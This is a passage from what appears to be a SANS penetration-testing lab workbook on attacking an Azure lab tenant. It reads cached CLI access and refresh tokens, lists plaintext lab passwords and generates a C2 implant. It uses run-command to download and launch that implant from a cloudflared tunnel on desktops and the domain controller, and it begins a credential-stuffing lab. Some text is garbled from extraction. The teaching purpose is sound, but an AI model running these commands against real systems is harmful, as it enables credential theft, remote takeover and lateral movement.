 "tenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
 "user": {
 "name": "aparker@hiboxy.com",
 "type": "user"
 }
 }
]
```

We now see a JSON array that comes back with the information. We have a "homeTenantId" value that matches the "tenantId" value in this array. As both of the values match, this is aparker's Home Tenant. One thing that we will want to note right now is that the Azure CLI tool will store all of the login information in the following folder:

- ~/.azure : Linux / OSX / Unix type shells. I.E. /home/sec560/.azure •
- %HOMEPATH%\.azure : Windows Location. I.E. C:\Users\sec560\.azure •

The first thing to understand is that in the latest version of the az tool on Windows, the token is *encrypted* when stored. This tool is no longer keeping a file called accessTokens.json. Instead, it uses a file called *msal\_token\_cache.json*, and the values in this file are encrypted. In Linux and OSX, this file is currently *not* encrypted.

"Previous versions of Azure CLI saved ADAL tokens and service principal entries to ~/.azure/accessToken.json . The latest versions of Azure CLI use MSAL and no longer generate accessTokens.json." (reference: https://docs.microsoft.com/en-us/cli/ azure/msal-based-azure-cli)

cat ~/.azure/msal\_token\_cache.json

```
Expected Results
 sec560@560vm:~$cat ~/.azure/msal_token_cache.json
 {
  "AccessToken" : {
  "cb8c34df-9d1f-4777-bbb2-0543fa476133.1c0060e4-c4db-4777-a48b-34a1515e33bf-
 login.microsoftonline.com-accesstoken-04b07795-8ddb-461a-bbee-02f9e1bf7b46-organizations-
 https://management.core.windows.net//.default https://management.core.windows.net//
 user_impersonation": {
  "credential_type" : "AccessToken",
  "secret" :
 "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkpZaEFjVFBNWl9MWDZEQmxPV1E3SG4wTmVYRSIsImtpZCI6IkpZaEFjVFBNWl9MW
  [...truncated for brevity...]
  " credential_type ": " RefreshToken",
  " secret": "0 .AUYA5GAAHNvEd0ekizShUV4zv5V3sATbjRpGu-4C-
 eG_e0bxAHM.AgABAwEAAADW6jl31mB3T7ugrWTT8pFeAwDs_wUA9P8xGkPqHlA4NkL9Q4Yx4oP2LqWKVHgjD8sFNe8IyA3rwFf9vKxMFjZBMhRjxLSFNwZXTGqQRs
  [...truncated for brevity...]
```

We can see that the Access Token, and also the Refresh Token are available.

az account get-access-token

#### Expected Results

```
sec560@560vm:~$ az account get-access-token
{
 "accessToken": 
"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkpZaEFjVFBNWl9MWDZEQmxPV1E3SG4wTmVYRSIsImtpZCI6IkpZaEFjVFBNWl9MW
m-ZTazV95VV9gA9wNvRQ0lwbI9MWm_gFDHanSC9a4iKHt_PaAUGK_Xmw1aY3g9qQ5xvXo9o8RM-
kgq9dfH0vRzoxhTuWlUNhdimhCX0cNhiJGEMZm8o-
oz10qYEC2_vLHn37YoLA7ONnimXBpzT4pDUv1VMHHyaWzHeWEz1252whZLl2t5yzCPlDlrUkIl0mFmup7UrrRI-
kRC7jngUtDJcHkbLbQSwHYOncsikmek1E1d4hueihvZQDhwsPzgdXeNA231FH0BFb4Cg",
 "expiresOn": "2025-09-08 19:38:52.000000",
 "expires_on": 1757360332,
 "subscription": "5c32501e-9ce5-4776-bf31-d96f8b71769e",
 "tenant": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
 "tokenType": "Bearer"
}
```

We can see an access token. These tokens are used as login material. What is missing is the Primary Refresh Token. This is no longer available as easily as it was. This makes it slightly harder to gain and use for persistent access.

On Windows is all lost? Not necessarily. There is a backup command that you can also use to extract the tokens from the tool. Let's continue on Linux though.

## *3: Looking at our permissions*

Permissions gathering for the cloud is tricky. You need specific IAM Read permissions to read across the Azure system. What happens if you don't have those IAM Read permissions? You would receive errors when attempting services. We *don't* have read available for us in our system. What do we have? We have access to Azure Virtual Machines. We can validate some of this by running a tool like ScoutSuite to see what "read" access levels we have.

We're going to use ScoutSuite for this purpose.

#### Please randomly select a user below

To reduce the odds of triggering smart lockout, please randomly select a credential below.

To get a random user run this command:

# Command

shuf -n1 -e aparker abates mlara slopez

Use the randomly selected user below:

aparker@hiboxy.com Password: Oozle11 - The first character is the letter O, not zero (0) •

abates@hiboxy.com Password: Metallica6 •

mlara@hiboxy.com Password: Packardbell350 •

slopez@hiboxy.com Password: Tibbetts3 •

If you are getting authentication errors, you can re-run the command and use a different username and password combination

scout azure --user-account --report-dir /tmp/scoutsuite --tenant hiboxy.com --no-browser

# Expected Results

```
sec560@560vm:~$ scout azure --user-account --report-dir /tmp/scoutsuite --tenant hiboxy.com --no-
browser
2025-09-08 18:23:45 560vm scout[5552] INFO Launching Scout
2025-09-08 18:23:45 560vm scout[5552] INFO Authenticating to cloud provider
Username: aparker@hiboxy.com
Password: 
/usr/local/lib/python3.12/dist-packages/msal/application.py:206: UserWarning: Please 
upgrade msal-extensions. Only msal-extensions 1.2+ can work with msal 1.30+
 warnings.warn(
2025-09-08 18:23:51 560vm scout[5552] INFO No subscription set, inferring
2025-09-08 18:23:51 560vm scout[5552] INFO Running against subscription 
5c32501e-9ce5-4776-bf31-d96f8b71769e
2025-09-08 18:23:51 560vm scout[5552] INFO Gathering data from APIs
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the Azure Active 
Directory service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the RBAC service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the Security Center 
service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the SQL Database service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the Storage Accounts 
service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the Key Vault service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the Network service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the Virtual Machines 
service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the App Services service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the MySQL Database 
service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the PostgresSQL 
Database service
2025-09-08 18:23:51 560vm scout[5552] INFO Fetching resources for the Logging Monitoring 
service
2025-09-08 18:24:00 560vm scout[5552] INFO Running pre-processing engine
2025-09-08 18:24:00 560vm scout[5552] INFO Running rule engine
2025-09-08 18:24:00 560vm scout[5552] INFO Applying display filters
2025-09-08 18:24:00 560vm scout[5552] INFO Running post-processing engine
2025-09-08 18:24:00 560vm scout[5552] INFO Saving data to /tmp/scoutsuite/scoutsuite-
results/scoutsuite_results_azure-tenant-hiboxy.com.js
2025-09-08 18:24:00 560vm scout[5552] INFO Saving data to /tmp/scoutsuite/scoutsuite-
results/scoutsuite_exceptions_azure-tenant-hiboxy.com.js
2025-09-08 18:24:00 560vm scout[5552] INFO Creating /tmp/scoutsuite/azure-tenant-
hiboxy.com.html
```

You will see the HTML report being written to the /tmp/scoutsuite directory. If you like, you can use your host operating system to view the report. It doesn't render well inside the Linux VM using Firefox. You can copy and paste the entire /tmp/scoutsuite directory to your host operating system and open the HTML file in a browser.

# *4: Working with Virtual Machines*

The next step is to look at virtual machines in the environment. Start by running the following commands:

| az vm list<br>-o<br>table                      |                    |  |
|------------------------------------------------|--------------------|--|
|                                                |                    |  |
| Expected Results                               |                    |  |
|                                                |                    |  |
|                                                |                    |  |
| sec560@560vm:~\$ az vm list<br>-o              | table              |  |
| Name<br>ResourceGroup                          | Location           |  |
|                                                |                    |  |
| hiboxy-dc1<br>HIBOXY                           | eastus2            |  |
| Win10-Desktop1 HIBOXY                          | eastus2            |  |
| Win10-Desktop2 HIBOXY                          | eastus2            |  |
|                                                |                    |  |
| Win10-Desktop3 HIBOXY<br>Win10-Desktop4 HIBOXY | eastus2<br>eastus2 |  |

Keep this in mind as we will be looking at an A/B difference between this access and another level of access. The az vm list command can show any external public IP addresses attached to systems. To do this, you must have the right to look at a system's network interfaces. This level of access is a separate scope in Azure.

az vm list -o table -d

# Expected Results

sec560@560vm:~\$ az vm list -o table -d

ERROR: (AuthorizationFailed) The client 'aparker@hiboxy.com' with object id 'cb8c34df-9d1f-4777-bbb2-0543fa476133' does not have authorization to perform action 'Microsoft.Network/networkInterfaces/read' over scope '/subscriptions/5c32501e-9ce5-4776 bf31-d96f8b71769e/resourceGroups/hiboxy/providers/Microsoft.Network/networkInterfaces/ hiboxy-dc1-primary' or the scope is invalid. If access was recently granted, please refresh your credentials.

Code: AuthorizationFailed

Message: The client 'aparker@hiboxy.com' with object id 'cb8c34df-9d1f-4777 bbb2-0543fa476133' does not have authorization to perform action 'Microsoft.Network/ networkInterfaces/read' over scope '/subscriptions/5c32501e-9ce5-4776-bf31-d96f8b71769e/ resourceGroups/hiboxy/providers/Microsoft.Network/networkInterfaces/hiboxy-dc1-primary' or the scope is invalid. If access was recently granted, please refresh your credentials.

The results show us how the scoping works in Azure. The user would need permissions to perform the following action: Microsoft.Network/networkInterfaces/read

And it has to be over the following scope (think about this as the object): /subscriptions/5c32501e-9ce5-4776-bf31 d96f8b71769e/resourceGroups/hiboxy/providers/Microsoft.Network/networkInterfaces/hiboxy-dc1-primary

The user however can read information about the virtual machine. Let's look at what the machine is:

az vm list

```
Expected Results
 ...truncated for brevity...
 [
  {
  "diagnosticsProfile": {
  "bootDiagnostics": {
  "enabled": true
  }
  },
  "etag": "\"3456593\"",
  "extensionsTimeBudget": "PT1H30M",
  "hardwareProfile": {
  "vmSize": "Standard_DS1_v2"
  },
  "id": "/subscriptions/5c32501e-9ce5-4776-bf31-d96f8b71769e/resourceGroups/HIBOXY/
 providers/Microsoft.Compute/virtualMachines/hiboxy-dc1",
  "identity": {
  "principalId": "502fafd9-1054-45e1-8051-b47262d297ce",
  "tenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
  "type": "SystemAssigned"
  },
  "location": "eastus2",
  "name": "hiboxy-dc1",
  "networkProfile": {
  "networkInterfaces": [
  {
  "id": "/subscriptions/5c32501e-9ce5-4776-bf31-d96f8b71769e/resourceGroups/
 hiboxy/providers/Microsoft.Network/networkInterfaces/hiboxy-dc1-primary",
  "primary": true,
  "resourceGroup": "hiboxy"
  }
  ]
  }
  }
 ]
 ...truncated for brevity...
```

We've prettified this JSON output for ease of reading. Let's look at the identity section:

# Partial content "identity": { "principalId": "502fafd9-1054-45e1-8051-b47262d297ce", "tenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf", "type": "SystemAssigned" },

This closure tells us that the machine we are looking at has a SystemAssigned managed Identity. These identities can give us more permissions. What we have to figure out is if we can use the *control plane* of the system to run *data plane* actions.

### *5: Azure Run-Command*

Let's take a look at Azure Run-Command. The first *warning* that we have is that Azure Run-Command is designed to run various commands on a remote system. It is not intended, however, for multi-user operations. Single-user operations will mean that you may see errors when many students are running commands. To make this easier, we have decided to give you a few options to connect by shuffling the desktop numbers to provide each student a chance to connect. If you encounter an error, try running the command a second time.

The command you see is shuf -i 1-5 -n 1 . This will output a number between 1 and 5 and will be random each time.

Another thing to consider is that run-command runs on an interval; sometimes it will come back quickly, and other times it will take a bit to return. It depends on when the last check-in period occurred. For run-command, patience is your friend.

![](SEC560_WorkBook2_page_213_Figure_0.jpeg)

#### Expected Results

```
sec560@560vm:~$ az vm run-command invoke--command-id RunPowerShellScript --name Win10-Desktop$(shuf
-i 1-5 -n1) -g HIBOXY --script 'Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -
Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -
Depth 64 -Compress; whoami'
{
 "value": [
 {
 "code": "ComponentStatus/StdOut/succeeded",
 "displayStatus": "Provisioning succeeded",
 "level": "Info",
 "message": "{\"compute\":{\"azEnvironment\":\"AzurePublicCloud\",\"customData\":
\"\",\"evictionPolicy\":\"\",\"isHostCompatibilityLayerVm\":\"false\",\"licenseType\":
\"\",\"location\":\"eastus2\",\"name\":\"Win10-Desktop2\",\"offer\":\"Windows-10\",
\"osProfile\":{\"adminUsername\":\"560Admin\",\"computerName\":\"Win10-Desktop2\",
\"disablePasswordAuthentication\":\"\"},\"osType\":\"Windows\",\"placementGroupId\":\"\",
\"plan\":{\"name\":\"\",\"product\":\"\",\"publisher\":\"\"},\"platformFaultDomain\":
\"0\",\"platformUpdateDomain\":\"0\",\"priority\":\"Regular\",\"provider\":
\"Microsoft.Compute\",\"publicKeys\":[],\"publisher\":\"MicrosoftWindowsDesktop\",
\"resourceGroupName\":\"HIBOXY\",\"resourceId\":\"/subscriptions/5c32501e-9ce5-4776-bf31-
d96f8b71769e/resourceGroups/HIBOXY/providers/Microsoft.Compute/virtualMachines/Win10-
Desktop2\",\"securityProfile\":{\"secureBootEnabled\":\"false\",\"virtualTpmEnabled\":
\"false\"},\"sku\":\"19h1-pro\",\"storageProfile\":{\"dataDisks\":[],\"imageReference\":
{\"id\":\"\",\"offer\":\"Windows-10\",\"publisher\":\"MicrosoftWindowsDesktop\",\"sku\":
\"19h1-pro\",\"version\":\"latest\"},\"osDisk\":{\"caching\":\"ReadWrite\",
\"createOption\":\"FromImage\",\"diffDiskSettings\":{\"option\":\"\"},\"diskSizeGB\":
\"127\",\"encryptionSettings\":{\"enabled\":\"false\"},\"image\":{\"uri\":\"\"},
\"managedDisk\":{\"id\":\"/subscriptions/5c32501e-9ce5-4776-bf31-d96f8b71769e/
resourceGroups/hiboxy/providers/Microsoft.Compute/disks/Win10-
Desktop2_OsDisk_1_153f71295d7a47118284802263836cd3\",\"storageAccountType\":
\"Standard_LRS\"},\"name\":\"Win10-Desktop2_OsDisk_1_153f71295d7a47118284802263836cd3\",
\"osType\":\"Windows\",\"vhd\":{\"uri\":\"\"},\"writeAcceleratorEnabled\":\"false\"},
\"resourceDisk\":{\"size\":\"7168\"}},\"subscriptionId\":\"5c32501e-9ce5-4776-bf31-
d96f8b71769e\",\"tags\":\"environment:SEC560_H01\",\"tagsList\":[{\"name\":
\"environment\",\"value\":\"SEC560_H01\"}],\"userData\":\"\",\"version\":
\"18362.1256.2012032308\",\"vmId\":\"c2e4666e-a05e-4c6e-b397-8f921b65a427\",
\"vmScaleSetName\":\"\",\"vmSize\":\"Standard_DS1_v2\",\"zone\":\"\"},\"network\":
{\"interface\":[{\"ipv4\":{\"ipAddress\":[{\"privateIpAddress\":\"10.100.1.6\",
\"publicIpAddress\":\"\"}],\"subnet\":[{\"address\":\"10.100.1.0\",\"prefix\":\"24\"}]},
\"ipv6\":{\"ipAddress\":[]},\"macAddress\":\"000D3AE69321\"}]}}\nnt authority\\system",
 "time": null
 },
 {
 "code": "ComponentStatus/StdErr/succeeded",
 "displayStatus": "Provisioning succeeded",
 "level": "Info",
 "message": "",
 "time": null
 }
```

 ] }

Let's try to understand what is happening here.

- We are running commands on the remote system; we can take over that system. 1.
- We are running these commands as "NT AUTHORITY\SYSTEM." Why? Because that's the context in which run-command runs. 2.
- We are seeing Identity Metadata. More importantly, we can probably even get Access Tokens or use the System Assigned identity to run commands in the Azure environment. 3.

Armed with this knowledge we can now construct an attack in which we can gain shells or perhaps move laterally.

# Conclusion

This lab was a continuation of our Azure attack paths. We leveraged existing credentials to log in to Azure using the Azure CLI. In Azure, this level of programmatic access is enabled for users with permissions to Subscriptions (or below Subscriptions, meaning Resource groups or individual resources). In other clouds, this level of programmatic access is not usually provided. The access in Azure is co-mingled with portal access.

We also successfully ran remote commands on machines located in the system. The next step is to explore how we will gain access to these systems using the various mechanisms that we have available to us.

# *Bonus Lab: Gaining Access and Moving Laterally*

# No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

# Objectives

- Log in to Azure using the compromised credentials •
- Use the credentials to scan for common Azure miscon figurations •
- Remotely execute commands on a system without having access to the network portion of Azure •

# Lab Setup

VMs used:

Linux •

# Lab – Step-by-Step Instructions

We will now be using the access we have to move into the environment and laterally. We will start by running commands on the ficant differences in our lab is that we must use a connect back service to get our shells over the Internet. We will be using Cloudflared tunnels to do this.

# *1: Setting up your terminal*

Open a new terminal and run the script below to setup your terminal with five tabs. The tabs will make it easier to know where each command should be executed.

# Command

/opt/setup-cloudflared-lab-terminal.sh

After running this command, close the original tab and use the 5 new tabs that were created.

You should now see a terminal with these 5 tabs:

- cloudflared-9000 1.
- cloudflared-9001 For the Python HTTP server tunnel (port 9001) 2.
- python-http For serving implants 3.
- 4.

#### azure - For Azure CLI commands 5.

It will be critical to keeping these in mind as we go through the labs.

# *2: Starting Cloudflared Tunnels*

We'll create two separate cloud

![](SEC560_WorkBook2_page_217_Figure_4.jpeg)

In this case, please hard-code your DNS server to use 1.1.1.1 as a workaround. Most likely, your configured DNS server is blocking parts of the eDNS request taking place. You can replace your DNS server by running the following commands: Then re-run your cloudflared command. Did you get an error about Initiating shutdown error="expected at least 2 Cloudflare Regions regions, but SRV only returned 1" ? sudo resolvectl dns eth0 1 .1.1.1 sudo resolvectl domain eth0 '~.'

Make note of your URL for port 9000! It will be different from the example.

Switch to tab cloudflared-9001 and start tunnel for Python HTTP (port 9001)

# Command cloudflared tunnel --url http://localhost:9001 Expected Results 2025-09-11T19:41:30Z INF Thank you for trying Cloudflare Tunnel. 2025-09-11T19:41:30Z INF Requesting new quick Tunnel on trycloudflare.com... 2025-09-11T19:41:30Z INF +-------------------------------------------------------------------------------------------- + 2025-09-11T19:41:30Z INF | Your quick Tunnel has been created! Visit it at (it may take some time to be reachable): | 2025-09-11TXXXXXXZ INF | https://YOUR-UNIQUE-SUBDOMAIN-2.trycloudflare.com | 2025-09-11T19:41:30Z INF +-------------------------------------------------------------------------------------------- + [...truncated for brevity...]

Make note of your URL for port 9001! It will be different from the example.

# *3: Setting up Python HTTP Server*

#### For this step, use terminal tab pyhon-http

We'll use Python3's HTTP server module to serve our implant files.

# Command python3 -m http.server 9001 Expected Results python-http:~\$ python3 -m http.server 9001 Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...

This server will serve files from /home/sec560 where our implants will be saved.

#### For this step, use terminal tab

![](SEC560_WorkBook2_page_219_Figure_1.jpeg)

Start a listener on port 9000 (matching our cloudflared tunnel):

![](SEC560_WorkBook2_page_219_Picture_3.jpeg)

Generate an implant for Windows. Use the cloudflared URL for port 9000 that you noted earlier.

# Use YOUR cloudflared URL

Replace CLOUDFLARED\_9000\_URL with your actual URL from tab cloudflared-9000 .

Example: https://YOUR-UNIQUE-SUBDOMAIN.trycloudflare.com

# Command

generate --os windows --skip-symbols -e --http YOUR\_CLOUDFLARED\_9000\_URL

# Replace the URL

Replace YOUR\_CLOUDFLARED\_9000\_URL with your full cloudflared URL from tab cloudflared-9000 (including https://).

# Expected Results

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [\*] Build completed in 2s
- [\*] Implant saved to /home/sec560/QUICK\_SHOOTDOWN.exe

*Your* 

The implant is now saved in /home/sec560/ where our Python HTTP server can serve it.

#### *5: Login to Azure*

#### For this step, use terminal tab azure

Run the below to log in to the Azure CLI using the credentials provided in the lab:

az login -u aparker@hiboxy.com -p Oozle11

#### Expected Results

```
azure:~$ az login -u aparker@hiboxy.com-p Oozle11
Starting September 1, 2025, MFA will be gradually enforced for Azure public cloud. The 
authentication with username and password in the command line is not supported with MFA. 
Consider using one of the compatible authentication methods. For more details, see 
https://go.microsoft.com/fwlink/?linkid=2276314
[
 {
 "cloudName": "AzureCloud",
 "homeTenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
 "id": "5c32501e-9ce5-4776-bf31-d96f8b71769e",
 "isDefault": true,
 "managedByTenants": [],
 "name": "Hiboxy",
 "state": "Enabled",
 "tenantDefaultDomain": "hiboxy.com",
 "tenantDisplayName": "Hiboxy",
 "tenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
 "user": {
 "name": "aparker@hiboxy.com",
 "type": "user"
 }
 }
]
```

# *6: Remotely running commands*

# For this step, use terminal tab azure

Before we execute our command we need to set a few environment variables. We'll start with selecting a random target machine.

# *Note: The number will be random between 1 and 5!* Command export TARGET="Win10-Desktopshuf \$( -i 1 -5 -n1)" && echo "Target: \$TARGET" Expected Results azure:~\$ export TARGET="Win10-Desktopshuf \$( -i 1-5 -n1)" && echo "Target: \$TARGET" Target: Win10-Desktop4

Next, get the name of the payload generated in step 4. In our example, it was called GRUBBY\_BUYER (remove the .exe). Your name will be different! Replace IMPLANT\_NAME\_HERE

![](SEC560_WorkBook2_page_222_Figure_2.jpeg)

Set an environment variable using the cloud flared URL for port 9001 (Python HTTP server).

export CLOUDFLARED\_9001= YOUR\_CLOUDFLARED\_9001\_URL && echo "URL: \$CLOUDFLARED\_9001"

# Use YOUR cloudflared URL

Replace YOUR\_CLOUDFLARED\_9001\_URL with your full cloudflared URL from tab cloudflared-9001 (including https://).

# Expected Results

azure:~\$ export CLOUDFLARED\_9001= YOUR\_CLOUDFLARED\_9001\_URL && echo "URL: \$CLOUDFLARED\_9001" URL: YOUR\_CLOUDFLARED\_9001\_URL

# Use YOUR cloudflared URL

Replace the URL above with your actual cloudflared URL from tab cloudflared-9001 .

Now we're ready to execute our payload!

az vm run-command invoke--command-id RunPowerShellScript --name \$TARGET-g HIBOXY --script "iwr \$CLOUDFLARED\_9001/\$NAME.exe -OutFile C:/Windows/Temp/\$NAME.exe; Start-Process C:/Windows/ Temp/\$NAME.exe"

#### Expected Results

```
azure:~$ az vm run-commandinvoke --command-id RunPowerShellScript --name $TARGET-g HIBOXY --script
"wget $CLOUDFLARED_9001/$NAME.exe -OutFile C:/Windows/Temp/$NAME.exe; Start-Process C:/
Windows/Temp/$NAME.exe"
{
"value": [
 {
 "code": "ComponentStatus/StdOut/succeeded",
 "displayStatus": "Provisioning succeeded",
 "level": "Info",
 "message": "",
 "time": null
 },
 {
 "code": "ComponentStatus/StdErr/succeeded",
 "displayStatus": "Provisioning succeeded",
 "level": "Info",
 "message": "",
 "time": null
 }
]
}
```

This command does the following:

- iwr ... : downloads the executable file via cloudflared tunnel and our Python HTTP server •
- Start-Process ... : immediately executes the implant in a separate process (fork-and-run) •

#### Expected Results

[\*] Session ec6f9cef YOUR\_IMPLANT\_NAME - tcp(127.0.0.1:XXXXX)->XX.XX.XX.XX (Win10-DesktopX) - windows/amd64 - [timestamp]

The hostname should match your target machine (Win10-Desktop1-5).

Why use Start-Process? Calling the implant directly would hang the run-command process. The run-command process will eventually die and restart, killing our implant and not allowing other students to use the machine. Using Start-Process solves both problems - it immediately returns control while the implant runs in a separate process (fork-and-run pattern).

This indicates successful exploitation of the system. You now have a shell on a device through only having had access to the Azure Portal.

# *7: Remotely executing commands*

We can now use the tab to interact with the session. The session ID in the example is ec6f9cef and we will access the session using the first two characters of the session ID. Your session ID will be different, so use the first two characters of your session ID instead.

# Important: Use execute command instead of shell

The shell command often fails with timeout errors. Instead, we'll use the execute command which reliably runs commands and returns output.

### Command

use XX

# Use YOUR session ID

Replace XX with the first two characters of YOUR session ID (shown when the session was established).

# Command execute -o whoami Expected Results [\*] Active session YOUR\_IMPLANT\_NAME (session-id-here) [\*] Output: nt authority\system

We now have access to a remote system. This system has a managed identity. Managed Identities allow Azure administrators to systematically assign permissions to a machine without worrying about static usernames or passwords. The machine's identity is then used for permissions to other Azure services. However, we can leverage tools like the az CLI tool to go in and use that identity for ourselves. Let's explore this.

#### *8: Situational awareness*

Now that we have compromised a machine, let's explore other systems we can connect to.

Authenticate from the compromised host using the managed identity.

execute -o -t 30 -- az.cmd login -i

# Expected Results

```
[*] Output:
[
 {
 "environmentName": "AzureCloud",
 "homeTenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
 "id": "5c32501e-9ce5-4776-bf31-d96f8b71769e",
 "isDefault": true,
 "managedByTenants": [],
 "name": "Hiboxy",
 "state": "Enabled",
 "tenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
 "user": {
 "assignedIdentityInfo": "MSI",
 "name": "systemAssignedIdentity",
 "type": "servicePrincipal"
 }
 }
```

Now, let's look at the list of machines.

# Command execute -o -t 30 -- az.cmd vm list -o table Expected Results [\*] Output: Name ResourceGroup Location Zones -------------- --------------- ---------- ------ hiboxy-dc1 HIBOXY eastus2 Win10-Desktop1 HIBOXY eastus2 Win10-Desktop2 HIBOXY eastus2 Win10-Desktop3 HIBOXY eastus2 Win10-Desktop4 HIBOXY eastus2 Win10-Desktop5 HIBOXY eastus2

Here we now see a hiboxy-dc1 system that is new to us. This system was not seen from the outside. The machine account for this system could be the one that we use to gain another foothold laterally.

We have a few options here, and they are potentially all valid.

- We can use standard attack tools on a Windows network to move laterally on the domain controller. These tools, such as Responder or Impacket, could work in the environment. 1.
- We could use the Azure Control Plane, just like we did before, to move laterally. We were not relying on legacy network protocols but the agents installed on the machines. 2.

For now, let's background our current session and move laterally to the domain controller using the Azure Control Plane:

| Command          |  |  |
|------------------|--|--|
| background       |  |  |
| Expected Results |  |  |
| [*] Background   |  |  |

#### *9: Lateral movement to the Domain Controller*

We'll move laterally to the domain controller (hiboxy-dc1) that we discovered, reusing the same implant from earlier.

# Switch back to the Azure tab and run:

# Command

az vm run-command invoke--command-id RunPowerShellScript --name hiboxy-dc1 -g HIBOXY --script "iwr \$CLOUDFLARED\_9001/\$NAME.exe -OutFile C:/Windows/Temp/\$NAME.exe; Start-Process C:/Windows/ Temp/\$NAME.exe"

# Reusing the same implant

This command uses the same \$NAME and \$CLOUDFLARED\_9001 variables you set earlier, reusing the original implant.

# Expected Results

```
azure:~$ az vm run-commandinvoke --command-id RunPowerShellScript --name hiboxy-dc1 -g HIBOXY--
script "iwr $CLOUDFLARED_9001/$NAME.exe -OutFile C:/Windows/Temp/$NAME.exe; Start-Process 
C:/Windows/Temp/$NAME.exe"
{
 "value": [
 {
 "code": "ComponentStatus/StdOut/succeeded",
 "displayStatus": "Provisioning succeeded",
 "level": "Info",
 "message": "",
 "time": null
 },
 {
 "code": "ComponentStatus/StdErr/succeeded",
 "displayStatus": "Provisioning succeeded",
 "level": "Info",
 "message": "",
 "time": null
 }
 ]
}
```

[\*] Session XXXXXXXX YOUR\_IMPLANT\_NAME - tcp(127.0.0.1:XXXXX)->XX.XX.XX.XX (hiboxy-dc1) - windows/amd64 - [timestamp]

Interact with the DC session using the first two characters of the session ID:

#### Command

use XX

# Use YOUR DC session ID

Replace XX with the first two characters of YOUR DC session ID (shown when the DC session was established).

# Command

execute -o whoami execute -o hostname execute -o net.exe accounts /domain

#### Expected Results

[\*] Active session YOUR\_IMPLANT\_NAME (dc-session-id-here)

[\*] Output: nt authority\system

[\*] Output: hiboxy-dc1

[\*] Output:

Force user logoff how long after time expires?: Never Minimum password age (days): 1 Maximum password age (days): 42 Minimum password length: 7 Length of password history maintained: 24 Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: PRIMARY

The command completed successfully.

The output shows Computer role: PRIMARY confirming this is the Primary Domain Controller!

We have now conquered the DC. The system is a Domain Controller with users synchronized to Entra ID. As a bonus exercise, you can look for users who have their synchronized accounts using the sourceAnchor attribute in the users LDAP setting: ms-DS-ConsistencyGuid.

# Conclusion

4.

In this lab, we successfully:

- Established stable C2 infrastructure using cloudflared tunnels flared provided persistent, reliable, free connections cloud without registration. 1.
- Compromised a Windows 10 desktop Using Azure run-command with managed identity permissions to execute our implant. 2.
- Performed lateral movement to the domain controller Leveraging the Azure control plane from our initial foothold to compromise the DC without traditional network pivoting. 3.
- to domain dominance.

Achieved SYSTEM access on the Primary Domain Controller - Completing the full attack chain from external Azure credentials

We leveraged the Azure control plane rather than traditional network protocols, demonstrating how cloud management interfaces can be abused for lateral movement.

# *Bonus Lab: Credential Stuffing to a Breach From Linux*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

An existing snapshot from ADExplorer is also available inside /home/sec560/labs/adexplorer-data, and you can use it in

# Objectives

- Analyze credential stuffing data for a given domain •
- Identify single-factor authentication services exposed by a company •
- Use credential stuffing to gain access via Remote Desktop Protocol (RDP) •
- Analyze the target system to find and exfiltrate sensitive data •

# Lab Setup

VM used:

Linux •

Confirm connectivity to the internal target IP:

# Command

ping -c 4 10 .130.10.10

# Expected Results

sec560@560vm:~\$ ping -c 4 10 .130.10.10 PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data. 64 bytes from 10.130.10.10: icmp\_seq=1 ttl=127 time=0.045 ms 64 bytes from 10.130.10.10: icmp\_seq=2 ttl=127 time=0.041 ms 64 bytes from 10.130.10.10: icmp\_seq=3 ttl=127 time=0.042 ms 64 bytes from 10.130.10.10: icmp\_seq=4 ttl=127 time=0.039 ms

#### Warning: OpenVPN Connection Required!

If you're unable to ping 10.130.10.10, you'll need to connect to the OpenVPN server before continuing. Browse to https:// connect.labs.sans.org/ and log in with your SANS account. Download the OpenVPN configuration file (filename sec560-labs-range.ovpn ) to your host operating system, copy and paste the file into your Linux virtual machine in sec560's Desktop, then run:

sudo openvpn --config ~/Desktop/sec560-labs-range.ovpn

Leave that terminal window open while you complete the lab. You can open a new terminal window, or a new tab (pressing Ctrl+Shift+T ), to continue with the lab.

# Step-by-Step Instructions

For this lab, you will find an exposed RDP server in the hiboxy.com Active Directory domain, find credentials for @hiboxy.com accounts from prior breaches, reuse those credentials to find working logins against the RDP server, then log in and exfiltrate data.

The lab demonstrates that breaches don't have to be complicated to be effective, nor do any "real" exploits need to be involved. Bugs get patched, but features are forever.

#### *1: Finding 1FA Services*

Hiboxy has given you internal network access for this penetration test through OpenVPN. They've con firmed that RDP01, their RDP server, is available externally using NAT from their firewall, though it has an internal IP address of 10.130.10.23.

First, let's confirm that the RDP server is accessible via VPN. Start a new terminal session (using the shortcut on the desktop) and run:

nmap10.130.10.23 -p 3389 --script rdp-ntlm-info -Pn

# Expected Results

